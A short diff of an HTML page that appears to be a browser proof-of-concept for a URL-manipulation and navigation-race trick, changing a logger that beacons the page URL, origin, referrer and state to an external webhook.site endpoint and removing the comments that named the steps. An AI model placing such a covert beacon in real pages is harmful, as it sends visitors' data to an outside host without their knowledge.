@@ -58,23 +58,21 @@ button {
 <script>
 const LOG_ENDPOINT = "https://webhook.site/562f0b30-3949-45c2-b3b0-0ac6de5470da";
 
-/* 🔥 CORS-proof forensic logger */
 function logEvent(type, extra = {}) {
   const data = {
     type,
-    ts: performance.now().toFixed(3),
+    ts: performance.now(),
     epoch: Date.now(),
     url: location.href,
     origin: location.origin,
+    referrer: document.referrer,
     visibility: document.visibilityState,
     readyState: document.readyState,
     ...extra
   };
 
-  const params = new URLSearchParams(data).toString();
-
-  // Image beacon → tidak kena CORS & tetap terkirim saat navigation
-  new Image().src = `${LOG_ENDPOINT}?${params}`;
+  const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
+  navigator.sendBeacon(LOG_ENDPOINT, blob);
 }
 
 const panel   = document.getElementById('panel');
@@ -103,7 +101,7 @@ function getLocation() {
   );
 }
 
-/* Step 1: URL manipulation */
+/* Step 1 */
 trigger.onclick = () => {
   logEvent("poc_started");
 
@@ -113,7 +111,7 @@ trigger.onclick = () => {
   panel.style.display = 'block';
 };
 
-/* Step 2: Navigation race */
+/* Step 2 */
 window.addEventListener('pageshow', () => {
   logEvent("pageshow");
 
